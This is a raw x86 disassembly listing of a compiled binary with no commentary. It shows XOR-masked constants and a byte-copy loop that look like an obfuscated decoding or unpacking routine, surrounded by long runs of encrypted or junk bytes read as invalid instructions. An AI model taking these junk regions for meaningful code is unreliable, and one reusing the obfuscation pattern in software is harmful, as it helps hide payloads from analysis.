  40f444:	cmp    DWORD PTR ds:0x4336ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4336ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4336ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4336ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4336db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4336db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4336db,edx
  40f498:	cmp    DWORD PTR ds:0x4336db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433891
  40f4af:	push   0x4338e7
  40f4b4:	push   0x4338cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4336db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433717
  40f4d2:	adc    DWORD PTR ds:0x433727,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax+0x476b2639]
  40f540:	cmp    al,0xd4
  40f542:	lods   al,BYTE PTR ds:[esi]
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	scas   eax,DWORD PTR es:[edi]
  40f54a:	ins    BYTE PTR es:[edi],dx
  40f54b:	xlat   BYTE PTR ds:[ebx]
  40f54c:	and    ch,BYTE PTR [ebp+0x31]
  40f54f:	inc    ebx
  40f550:	mov    esp,0xce3eb929
  40f555:	or     ecx,eax
  40f557:	mov    BYTE PTR [esi+edx*2],0xb4
  40f55b:	dec    esp
  40f55c:	xor    ecx,eax
  40f55e:	dec    bp
  40f560:	inc    edi
  40f561:	mov    dl,0xc2
  40f563:	fmulp  st(3),st
  40f565:	clc    
  40f566:	jecxz  0x40f505
  40f568:	ret    0xaa46
  40f56b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f56c:	sub    al,0x27
  40f56e:	xor    ecx,ebx
  40f570:	jae    0x40f5d8
  40f572:	and    eax,0x42c62f9d
  40f577:	adc    al,0x17
  40f579:	cmp    ebx,DWORD PTR [eax+0x7fca2f2]
  40f57f:	test   BYTE PTR [edx-0x46c2bf6b],bl
  40f585:	in     eax,dx
  40f586:	(bad)  
  40f587:	imul   edi,DWORD PTR [ecx+0x33871406],0x77be54e9
  40f591:	xlat   BYTE PTR cs:[ebx]
  40f593:	sti    
  40f594:	loope  0x40f5a7
  40f596:	sub    esp,ebx
  40f598:	test   DWORD PTR [esp+ebp*2+0x1f],eax
  40f59c:	pop    ss
  40f59d:	dec    esi
  40f59e:	neg    BYTE PTR [ecx]
  40f5a0:	sub    BYTE PTR [edx-0x38254ce5],ah
  40f5a6:	cmp    ah,BYTE PTR [eax+0x36]
  40f5a9:	test   eax,0xb67a68b0
  40f5ae:	jbe    0x40f5a7
  40f5b0:	ret    
  40f5b1:	out    0x9e,eax
  40f5b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5b4:	cs xor al,0xe1
  40f5b7:	ins    DWORD PTR es:[edi],dx
  40f5b8:	out    0xd5,eax
  40f5ba:	fcmovb st,st(1)
  40f5bc:	mov    eax,ds:0x882f4be9
  40f5c1:	cmp    ah,BYTE PTR [esi+edx*4]
  40f5c4:	jmp    0x40f638
  40f5c6:	fwait
  40f5c7:	push   eax
  40f5c8:	pop    eax
  40f5c9:	into   
  40f5ca:	jmp    0x1ec1a73a
  40f5cf:	fidiv  WORD PTR [esi+0xcc9941e]
  40f5d5:	imul   ecx,DWORD PTR [ecx+0x1f],0x456368a2
  40f5dc:	cld    
  40f5dd:	sar    BYTE PTR [eax-0x53],cl
  40f5e0:	rol    BYTE PTR [ecx+0x3],cl
  40f5e3:	push   0xffffffd8
  40f5e5:	sbb    dh,ah
  40f5e7:	push   ss
  40f5e8:	mov    esp,0x5045fb45
  40f5ed:	and    BYTE PTR [edx],dh
  40f5ef:	mov    bh,0x75
  40f5f1:	ds cwde 
  40f5f3:	mov    ch,0xd9
  40f5f5:	or     eax,0xa0534437
  40f5fa:	adc    al,BYTE PTR [ecx-0x5c]
  40f5fd:	sbb    bl,ah
  40f5ff:	fisttp DWORD PTR [esp+eiz*8]
  40f602:	push   0xaf973b99
  40f607:	outs   dx,DWORD PTR ds:[esi]
  40f608:	inc    esi
  40f609:	bound  edi,QWORD PTR [ebx-0x18]
  40f60c:	xchg   esp,eax
  40f60d:	inc    ebx
  40f60e:	jnp    0x40f5bb
  40f610:	jmp    0xaa71a5ab
  40f615:	lock push ds
  40f617:	jg     0x40f5e7
  40f619:	adc    DWORD PTR [esi],edx
  40f61b:	xchg   edi,eax
  40f61c:	add    dl,BYTE PTR [esi+edx*1-0x42d41304]
  40f623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f624:	add    BYTE PTR [edx+esi*2+0xbf308a0],dl
  40f62b:	fisub  DWORD PTR [ebp-0x7641b163]
  40f631:	lods   al,BYTE PTR es:[esi]
  40f633:	lods   al,BYTE PTR ds:[esi]
  40f634:	mov    eax,ds:0x64fede3b
  40f639:	inc    edi
  40f63a:	nop
  40f63b:	rcr    DWORD PTR [edi+0x29],1
  40f63e:	sub    BYTE PTR [eax+0xa84508e],bl
  40f644:	ror    BYTE PTR [ecx-0x50f3955f],cl
  40f64a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f64b:	int    0x12
  40f64d:	push   0xbc1d3c1c
  40f652:	int    0xf3
  40f654:	jmp    0x7156:0xd31fd782
  40f65b:	push   0xa3ecb14e
  40f660:	mov    bh,BYTE PTR [ecx+0x234b1f16]
  40f666:	or     DWORD PTR [ebx],ebx
  40f668:	fst    st(5)
  40f66a:	cld    
  40f66b:	loopne 0x40f69f
  40f66d:	das    
  40f66e:	gs ins BYTE PTR es:[edi],dx
  40f670:	imul   ecx,ebp,0x4594d13e
  40f676:	ficom  DWORD PTR ds:0xb691f795
  40f67c:	adc    edi,ebp
  40f67e:	dec    eax
  40f67f:	inc    eax
  40f680:	and    al,0x70
  40f682:	enter  0x6597,0x88
  40f686:	xchg   edx,eax
  40f687:	adc    DWORD PTR [ebx-0x22ddc084],0xffffffe7
  40f68e:	cmp    BYTE PTR ds:0xe45b7c58,ah
  40f694:	push   eax
  40f695:	push   cs
  40f696:	ror    DWORD PTR [esi-0x2f],cl
  40f699:	ds dec eax
  40f69b:	dec    esp
  40f69c:	jb     0x40f64f
  40f69e:	jl     0x40f6fc
  40f6a0:	adc    eax,0x316e85a3
  40f6a5:	sub    al,0x4
  40f6a7:	inc    ebp
  40f6a8:	loop   0x40f727
  40f6aa:	loopne 0x40f6da
  40f6ac:	sbb    al,0x42
  40f6ae:	mov    bl,0xf4
  40f6b0:	cmc    
  40f6b1:	and    eax,0xc8e9778c
  40f6b6:	jge    0x40f663
  40f6b8:	je     0x40f6c8
  40f6ba:	mov    ds:0x9e245769,eax
  40f6bf:	pop    ds
  40f6c0:	ret    0x8cff
  40f6c3:	xor    ebp,DWORD PTR [ebp-0x5d]
  40f6c6:	sbb    BYTE PTR [ebx+eiz*8],bl
  40f6c9:	and    al,0x48
  40f6cb:	daa    
  40f6cc:	xchg   ebx,eax
  40f6cd:	xor    DWORD PTR [edi+ecx*8+0x74],eax
  40f6d1:	cmp    eax,0xc1a520f4
  40f6d6:	and    bl,BYTE PTR [ecx+0xc]
  40f6d9:	iret   
  40f6da:	nop
  40f6db:	sbb    al,0xc5
  40f6dd:	push   edi
  40f6de:	ror    DWORD PTR [eax+0x4d0ed04c],cl
  40f6e4:	out    dx,eax
  40f6e5:	jno    0x40f6bc
  40f6e7:	lahf   
  40f6e8:	pop    eax
  40f6e9:	lds    esp,FWORD PTR [ecx+0x6587cac2]
  40f6ef:	jb     0x40f709
  40f6f1:	cld    
  40f6f2:	mov    dh,0x9c
  40f6f4:	imul   edx,DWORD PTR [ebx],0xffffffa5
  40f6f7:	push   ebx
  40f6f8:	mov    dl,BYTE PTR [ebx+0x53]
  40f6fb:	fcomp  DWORD PTR [ebx-0x4bf4da94]
  40f701:	and    eax,0xa9bfc58e
  40f706:	mov    eax,ds:0x6560fb41
  40f70b:	iret   
  40f70c:	fs in  eax,dx
  40f70e:	xor    ecx,DWORD PTR [edx-0x44590fbb]
  40f714:	jl     0x40f6d7
  40f716:	(bad)  
  40f717:	out    0xfe,al
  40f719:	rol    BYTE PTR [esi-0x2831f0d1],cl
  40f71f:	push   cs
  40f720:	test   ebp,ebp
  40f722:	inc    edi
  40f723:	adc    eax,0x5d101edc
  40f728:	cld    
  40f729:	xor    BYTE PTR [edx-0x1f5fb216],cl
  40f72f:	dec    ebp
  40f730:	mov    cl,0x97
  40f732:	dec    ebp
  40f733:	add    bh,BYTE PTR [esi]
  40f735:	mov    ds:0xd0ec6cf3,al
  40f73a:	or     eax,DWORD PTR [esi]
  40f73c:	add    al,dl
  40f73e:	lahf   
  40f73f:	lods   eax,DWORD PTR ss:[esi]
  40f741:	jno    0x40f752
  40f743:	xor    al,0x60
  40f745:	mov    esp,0xfd3c104
  40f74a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f74b:	ror    ecx,1
  40f74d:	call   0xba3a:0x6c0dd3bd
  40f754:	pop    esi
  40f755:	fs call 0x6866:0x5c03d41
  40f75d:	jle    0x40f770
  40f75f:	xor    al,0x98
  40f761:	daa    
  40f762:	mov    edi,DWORD PTR [ecx+eax*4+0x6fb66c79]
  40f769:	push   0xd864c782
  40f76e:	xchg   edi,eax
  40f76f:	mov    edi,ebp
  40f771:	cmp    al,0x5f
  40f773:	xchg   esi,eax
  40f774:	rol    BYTE PTR [ebp-0x7d],1
  40f777:	popf   
  40f778:	dec    esp
  40f779:	push   ebp
  40f77a:	mov    al,ds:0xf7555aa2
  40f77f:	iret   
  40f780:	xchg   ebp,eax
  40f781:	je     0x40f71a
  40f783:	pop    ebx
  40f784:	add    al,0xdd
  40f786:	sbb    al,0x1e
  40f788:	int    0x34
  40f78a:	repnz test eax,0x326ee6e5
  40f790:	xchg   DWORD PTR [edi],esi
  40f792:	jnp    0x40f755
  40f794:	clc    
  40f795:	or     bl,BYTE PTR [ecx+0x27a8b4db]
  40f79b:	sub    esi,DWORD PTR [eax+ebx*8]
  40f79e:	push   cs
  40f79f:	fucomp st(3)
  40f7a1:	das    
  40f7a2:	stos   DWORD PTR es:[edi],eax
  40f7a3:	or     al,0xed
  40f7a5:	sub    al,0xac
  40f7a7:	push   edi
  40f7a8:	pop    edi
  40f7a9:	das    
  40f7aa:	daa    
  40f7ab:	out    0x47,al
  40f7ad:	sti    
  40f7ae:	and    ecx,esi
  40f7b0:	dec    ecx
  40f7b1:	cmp    esi,DWORD PTR [edi]
  40f7b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7b4:	retf   
  40f7b5:	push   ss
  40f7b6:	inc    esi
  40f7b7:	aad    0xae
  40f7b9:	fs dec edi
  40f7bb:	mov    DWORD PTR [esi],ebp
  40f7bd:	adc    eax,0xfa9e5c2f
  40f7c2:	cmp    DWORD PTR [edx+eiz*2+0x3d339a4c],edi
  40f7c9:	mov    ch,0x2c
  40f7cb:	mov    BYTE PTR [esi+0x7f2328f3],0xee
  40f7d2:	fsqrt  
  40f7d4:	sub    DWORD PTR [ebp+0x31d39e59],eax
  40f7da:	jecxz  0x40f78c
  40f7dc:	inc    edx
  40f7dd:	repz aas 
  40f7df:	shl    BYTE PTR [ebx+0xdd86fb9],1
  40f7e5:	outs   dx,BYTE PTR ds:[esi]
  40f7e6:	dec    ebx
  40f7e7:	mov    bl,0xaa
  40f7e9:	in     eax,0x89
  40f7eb:	xchg   DWORD PTR [edi-0x48],esp
  40f7ee:	jp     0x40f7a5
  40f7f0:	or     DWORD PTR gs:[esi-0x48],edi
  40f7f4:	mov    ch,0x5
  40f7f6:	xor    edi,DWORD PTR [eax-0x5a22f84d]
  40f7fc:	jp     0x40f80a
  40f7fe:	mov    edi,0x82264819
  40f803:	dec    ebx
  40f804:	std    
  40f805:	cld    
  40f806:	ja     0x40f82f
  40f808:	and    edi,0xffffff93
  40f80b:	push   0x2b9a1fe3
  40f810:	sub    dl,cl
  40f812:	dec    eax
  40f813:	enter  0x9b77,0xfb
  40f817:	mov    edi,0x78fb4e80
  40f81c:	xchg   ebp,eax
  40f81d:	xchg   esi,ecx
  40f81f:	cdq    
  40f820:	dec    ch
  40f822:	(bad)  
  40f823:	in     al,dx
  40f824:	push   ebp
  40f825:	xchg   edi,eax
  40f826:	dec    esi
  40f827:	aas    
  40f828:	fld    TBYTE PTR [ebp-0x3168724d]
  40f82e:	mov    ds:0xc2df7430,eax
  40f833:	jecxz  0x40f821
  40f835:	fwait
  40f836:	or     eax,0x57
  40f839:	jmp    DWORD PTR [edx]
  40f83b:	pop    ds
  40f83c:	and    bh,BYTE PTR [edx+esi*4]
  40f83f:	sub    al,0x8
  40f841:	push   eax
  40f842:	pop    ebp
  40f843:	mov    ds:0xc163b2d2,eax
  40f848:	inc    eax
  40f849:	add    BYTE PTR [ebx+esi*1-0x7],bh
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0x29f2873f
  40f897:	jg     0x40f86b
  40f899:	stos   DWORD PTR es:[edi],eax
  40f89a:	jle    0x40f91a
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	cmp    eax,0x9c1fe3bb
  40f8a5:	addr16 push edx
  40f8a7:	out    dx,al
  40f8a8:	in     al,dx
  40f8a9:	push   0x3f
  40f8ab:	or     eax,0xb4a0e5ec
  40f8b0:	shl    cl,cl
  40f8b2:	push   ds
  40f8b3:	call   0x4e6c4949
  40f8b8:	inc    edi
  40f8b9:	jmp    0xf701:0x429ff3c8
  40f8c0:	test   eax,0x7b3faa55
  40f8c5:	jb     0x40f8a8
  40f8c7:	adc    edi,edi
  40f8c9:	aam    0x1f
  40f8cb:	fst    st(2)
  40f8cd:	and    edx,DWORD PTR [esi+0x5]
  40f8d0:	retf   0x3cff
  40f8d3:	jle    0x40f8ce
  40f8d5:	pop    edx
  40f8d6:	mov    ebx,0x32b8dc0c
  40f8db:	jmp    0x40f862
  40f8dd:	iret   
  40f8de:	adc    al,0x60
  40f8e0:	xor    dh,dl
  40f8e2:	lock add eax,0xe773018a
  40f8e8:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8ea:	push   0x6a2cf2d7
  40f8ef:	pop    esi
  40f8f0:	pop    ebp
  40f8f1:	nop
  40f8f2:	loopne 0x40f8f9
  40f8f4:	lahf   
  40f8f5:	and    BYTE PTR [ebp-0x70],bh
  40f8f8:	inc    edx
  40f8f9:	lods   al,BYTE PTR ds:[esi]
  40f8fa:	dec    ebp
  40f8fb:	mov    edx,0xb0dceeec
  40f900:	pop    edx
  40f901:	add    ah,al
  40f903:	popf   
  40f904:	jle    0x40f95c
  40f906:	push   ecx
  40f907:	xor    edx,DWORD PTR [esi-0x21]
  40f90a:	test   cl,al
  40f90c:	sub    edx,0x43
  40f90f:	sub    DWORD PTR [edx+0x3c02001c],ebp
  40f915:	cmp    al,0xbf
  40f917:	xor    BYTE PTR [edx+0x2e],0xae
  40f91b:	je     0x40f91a
  40f91d:	mov    ?,eax
  40f91f:	adc    al,0xc
  40f921:	fisttp WORD PTR [edi+0x7c3f1e0d]
  40f927:	aad    0xae
  40f929:	test   al,0xc3
  40f92b:	dec    edi
  40f92c:	jp     0x40f953
  40f92e:	inc    edx
  40f92f:	inc    ebx
  40f930:	test   BYTE PTR [ebx],bh
  40f932:	not    BYTE PTR fs:[ebp+0x1613e346]
  40f939:	cmp    ecx,0xfffffff5
  40f93c:	loop   0x40f904
  40f93e:	test   DWORD PTR [eax+0x4],ebp
  40f941:	cmp    eax,0x5172b4da
  40f946:	or     cl,bl
  40f948:	cmp    al,0xe4
  40f94a:	addr16 jle 0x40f8dd
  40f94d:	pop    ss
  40f94e:	rol    BYTE PTR [ebp-0x73d677ca],cl
  40f954:	cmp    al,0x5d
  40f956:	or     DWORD PTR [eax-0x415d0832],edi
  40f95c:	(bad)  
  40f95d:	push   edx
  40f95e:	outs   dx,BYTE PTR ds:[esi]
  40f95f:	mov    ebp,0x464415b5
  40f964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f965:	adc    eax,0x6c8c755d
  40f96a:	mov    ecx,0xf462eed6
  40f96f:	mov    bh,0x5b
  40f971:	dec    esi
  40f972:	xchg   ecx,eax
  40f973:	pushf  
  40f974:	bound  edi,QWORD PTR ds:0xceb33268
  40f97a:	mov    edx,DWORD PTR [eax+0x48]
  40f97d:	hlt    
  40f97e:	xchg   esi,eax
  40f97f:	cmp    DWORD PTR [ecx],esp
  40f981:	cdq    
  40f982:	ret    0xe4e3
  40f985:	pop    ebx
  40f986:	pop    edx
  40f987:	retf   0x8e64
  40f98a:	mov    ebx,0x1479965f
  40f98f:	xchg   ecx,eax
  40f990:	popa   
  40f991:	dec    edx
  40f992:	fs inc ebp
  40f994:	ins    BYTE PTR es:[edi],dx
  40f995:	cmp    ah,BYTE PTR [edx+0x3e]
  40f998:	push   esp
  40f999:	cmp    BYTE PTR [edx+0x55],ah
  40f99c:	jl     0x40f968
  40f99e:	inc    ebp
  40f99f:	aaa    
  40f9a0:	sbb    cl,BYTE PTR ds:0x1a7059d7
  40f9a6:	fisub  WORD PTR [ecx]
  40f9a8:	sbb    al,0x70
  40f9aa:	pop    ds
  40f9ab:	and    BYTE PTR [ebx-0x3c],0x28
  40f9af:	lds    ebx,FWORD PTR [esi]
  40f9b1:	arpl   WORD PTR [esi],bp
  40f9b3:	jne    0x40f9f1
  40f9b5:	aad    0x7a
  40f9b7:	into   
  40f9b8:	or     cl,bh
  40f9ba:	xchg   edi,eax
  40f9bb:	inc    ecx
  40f9bc:	cdq    
  40f9bd:	nop
  40f9be:	pusha  
  40f9bf:	cmc    
  40f9c0:	jl     0x40f9c6
  40f9c2:	jno    0x40f949
  40f9c4:	call   0x41c8cef
  40f9c9:	mov    edi,0xad71e014
  40f9ce:	(bad)  
  40f9cf:	ins    BYTE PTR es:[edi],dx
  40f9d0:	out    0x56,al
  40f9d2:	xchg   ecx,eax
  40f9d3:	les    edx,FWORD PTR [ecx]
  40f9d5:	jg     0x40fa52
  40f9d7:	int3   
  40f9d8:	aaa    
  40f9d9:	and    bh,dh
  40f9db:	scas   eax,DWORD PTR es:[edi]
  40f9dc:	ja     0x40f976
  40f9de:	retf   
  40f9df:	mov    esi,0x5617c43c
  40f9e4:	in     eax,0xf9
  40f9e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9e7:	sub    BYTE PTR [eax-0x4e52c5b7],dh
  40f9ed:	arpl   WORD PTR [ebx+edx*4+0x3e],bp
  40f9f1:	(bad)  
  40f9f2:	adc    ebp,ebp
  40f9f4:	stos   BYTE PTR es:[edi],al
  40f9f5:	aad    0x82
  40f9f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9f8:	mov    eax,0xf3dc88d9
  40f9fd:	jno    0x40f9bf
  40f9ff:	adc    DWORD PTR [edx+0x4f267e81],ebx
  40fa05:	push   cs
  40fa06:	mov    al,0xbd
  40fa08:	inc    esp
  40fa09:	adc    eax,0xffffffcb
  40fa0c:	test   edi,0xc38f4997
  40fa12:	(bad)  
  40fa13:	out    dx,al
  40fa14:	add    eax,0x709d15ed
  40fa19:	fld    DWORD PTR ds:0x52285c5b
  40fa1f:	xor    ch,BYTE PTR [eax+edi*4+0x0]
  40fa23:	div    DWORD PTR [eax-0x23447b8d]
  40fa29:	or     al,0x8c
  40fa2b:	add    BYTE PTR [edx-0x7cd463bf],bl
  40fa31:	push   ss
  40fa32:	lea    edx,[ecx-0x56889080]
  40fa38:	inc    ebx
  40fa39:	ja     0x40faa2
  40fa3b:	outs   dx,BYTE PTR ds:[esi]
  40fa3c:	sub    BYTE PTR [ecx],dl
  40fa3e:	sbb    al,0x63
  40fa40:	cli    
  40fa41:	nop
  40fa42:	lea    edi,[ebp+0xe]
  40fa45:	out    0x20,al
  40fa47:	fcomp  st(0)
  40fa49:	fnstsw WORD PTR [ecx-0x3f63d749]
  40fa4f:	cmp    BYTE PTR [eax],al
  40fa51:	loopne 0x40fa2e
  40fa53:	int    0xcd
  40fa55:	or     edx,ebp
  40fa57:	mov    dh,BYTE PTR [ebp+0xf1779d1]
  40fa5d:	jno    0x40fa52
  40fa5f:	add    edx,DWORD PTR [esi-0x6464e049]
  40fa65:	mov    ch,0x62
  40fa67:	test   DWORD PTR [esi],0x5059bf4a
  40fa6d:	fstp   QWORD PTR [eax-0x188ec215]
  40fa73:	dec    ebp
  40fa74:	push   eax
  40fa75:	adc    dh,BYTE PTR [ebp+edi*2-0x43]
  40fa79:	mov    DWORD PTR [ebp+0x3c],ecx
  40fa7c:	ror    DWORD PTR [ecx+ecx*4-0x41],0x17
  40fa81:	leave  
  40fa82:	xor    eax,0x75850b82
  40fa87:	mov    ch,0x8b
  40fa89:	nop
  40fa8a:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40fa8c:	or     edx,ebp
  40fa8e:	lods   eax,DWORD PTR ds:[esi]
  40fa8f:	call   0xf49aa94c
  40fa94:	xchg   esp,eax
  40fa95:	sbb    al,0xdf
  40fa97:	pop    edi
  40fa98:	jne    0x40faa9
  40fa9a:	call   0x4d4cb25b
  40fa9f:	(bad)  
  40faa0:	repz jmp 0x2dd3:0xd35afaf4
  40faa8:	mov    bh,BYTE PTR [eax+edi*1+0x22]
  40faac:	(bad)  
  40faad:	jae    0x40fb28
  40faaf:	jae    0x40fa9b
  40fab1:	fadd   QWORD PTR [edi]
  40fab3:	pop    eax
  40fab4:	xchg   esp,eax
  40fab5:	jae    0x40fa4a
  40fab7:	lods   eax,DWORD PTR ds:[esi]
  40fab8:	ror    esp,1
  40faba:	adc    edi,DWORD PTR [ecx+0x9]
  40fabd:	nop
  40fabe:	push   ebx
  40fabf:	stos   BYTE PTR es:[edi],al
  40fac0:	stc    
  40fac1:	xchg   ecx,eax
  40fac2:	fcom   st(1)
  40fac4:	or     BYTE PTR [ecx+0x64f7ee44],ah
  40faca:	mov    dh,0x32
  40facc:	sub    BYTE PTR [di],ch
  40facf:	(bad)  
  40fad0:	rol    BYTE PTR [ecx+0x51d51fe3],cl
  40fad6:	aaa    
  40fad7:	rcr    BYTE PTR [ecx-0x45b7652d],0xc8
  40fade:	jg     0x40faf5
  40fae0:	les    esp,FWORD PTR [edx+0x2d]
  40fae3:	push   ebp
  40fae4:	(bad)  
  40fae5:	mov    esi,0x8072ac08
  40faea:	inc    ebp
  40faeb:	cs rcr ah,1
  40faee:	push   ebp
  40faef:	push   esp
  40faf0:	jecxz  0x40fae7
  40faf2:	out    0x47,al
  40faf4:	adc    BYTE PTR [ecx],0xd5
  40faf7:	nop
  40faf8:	repz add ebx,edi
  40fafb:	loopne 0x40fabe
  40fafd:	mov    bl,0x55
  40faff:	shl    DWORD PTR [edx+edx*2+0x164dc24e],1
  40fb06:	and    cl,BYTE PTR [ecx+0x56d70d23]
  40fb0c:	mov    al,ds:0x732f7898
  40fb11:	dec    ecx
  40fb12:	(bad)  
  40fb13:	fnstenv [esi]
  40fb15:	cmp    BYTE PTR [ecx+0x25e7cb0f],0xbd
  40fb1c:	pop    ds
  40fb1d:	jno    0x40fb5c
  40fb1f:	dec    ebp
  40fb20:	and    eax,0xf8c38b73
  40fb25:	int3   
  40fb26:	mov    WORD PTR fs:[eax-0x1f],es
  40fb2a:	into   
  40fb2b:	jecxz  0x40fb4d
  40fb2d:	adc    ah,BYTE PTR [edx-0x42]
  40fb30:	ins    BYTE PTR es:[edi],dx
  40fb31:	or     ebp,ecx
  40fb33:	pop    es
  40fb34:	mov    esp,0x4878859f
  40fb39:	sub    al,0x20
  40fb3b:	or     DWORD PTR [edx+edi*1+0x6e81c58],esi
  40fb42:	iret   
  40fb43:	das    
  40fb44:	popf   
  40fb45:	mov    bh,0x74
  40fb47:	adc    bh,0x70
  40fb4a:	jmp    0x40fad3
  40fb4c:	dec    ebx
  40fb4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb4e:	adc    eax,0xebaca7b2
  40fb53:	outs   dx,BYTE PTR ds:[esi]
  40fb54:	jecxz  0x40fb69
  40fb56:	sbb    BYTE PTR [ebx-0x59],ch
  40fb59:	repnz imul bh
  40fb5c:	bnd jle 0x40fae9
  40fb5f:	dec    ebx
  40fb60:	stos   BYTE PTR es:[edi],al
  40fb61:	addr16 in al,dx
  40fb63:	fmul   DWORD PTR [esi]
  40fb65:	ja     0x40fbda
  40fb67:	adc    DWORD PTR [ebp+0x6e],esp
  40fb6a:	sbb    BYTE PTR [edi+0x1e10bc53],0x9d
  40fb71:	xor    BYTE PTR [esi],0xd
  40fb74:	into   
  40fb75:	test   eax,0xf24567f3
  40fb7a:	xor    eax,esp
  40fb7c:	cdq    
  40fb7d:	mov    al,ds:0xf06403e0
  40fb82:	pop    ecx
  40fb83:	jb     0x40fb36
  40fb85:	xor    al,0xfd
  40fb87:	xor    ch,BYTE PTR [edi+0xb572e97]
  40fb8d:	push   edx
  40fb8e:	jb     0x40fb3b
  40fb90:	(bad)  
  40fb92:	scas   eax,DWORD PTR es:[edi]
  40fb93:	dec    esi
  40fb94:	ret    
  40fb95:	repnz and BYTE PTR [edx+edx*1-0x49],dh
  40fb9a:	fwait
  40fb9b:	push   cs
  40fb9c:	fistp  WORD PTR [edx+0x60be1977]
  40fba2:	jbe    0x40f521
  40fba8:	pop    ebx
  40fba9:	mov    eax,0xf89c8532
  40fbae:	pop    edi
  40fbaf:	pop    esi
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffffbf
  40fbc9:	(bad)  
  40fbca:	jo     0x40fbf1
  40fbcc:	shl    BYTE PTR [esi+0x7d7c7e7e],1
  40fbd2:	jle    0x40fc52
  40fbd4:	in     eax,0x81
  40fbd6:	shl    BYTE PTR [esi],0xd2
  40fbd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbda:	repnz imul ebp,DWORD PTR [ebp-0x10],0xfffffffd
  40fbdf:	xchg   edi,eax
  40fbe0:	(bad)  
  40fbe1:	pop    esp
  40fbe2:	jecxz  0x40fbaa
  40fbe4:	sbb    eax,0x4933b2c6
  40fbe9:	jg     0x40fc65
  40fbeb:	mov    DWORD PTR [eax+0x4b8d7b4f],edx
  40fbf1:	add    ch,BYTE PTR [ebx+eiz*4-0x53eb06d0]
  40fbf8:	call   0x4ce6:0x73dfad58
  40fbff:	jae    0x40fc45
  40fc01:	sbb    eax,0xf9338b1c
  40fc06:	ja     0x40fbb4
  40fc08:	ficom  WORD PTR [ebp-0x40]
  40fc0b:	cli    
  40fc0c:	(bad)  
  40fc0d:	cdq    
  40fc0e:	xchg   ecx,eax
  40fc0f:	sub    eax,DWORD PTR [edi+0x4e]
  40fc12:	xchg   esi,eax
  40fc13:	retf   
  40fc14:	loop   0x40fbfe
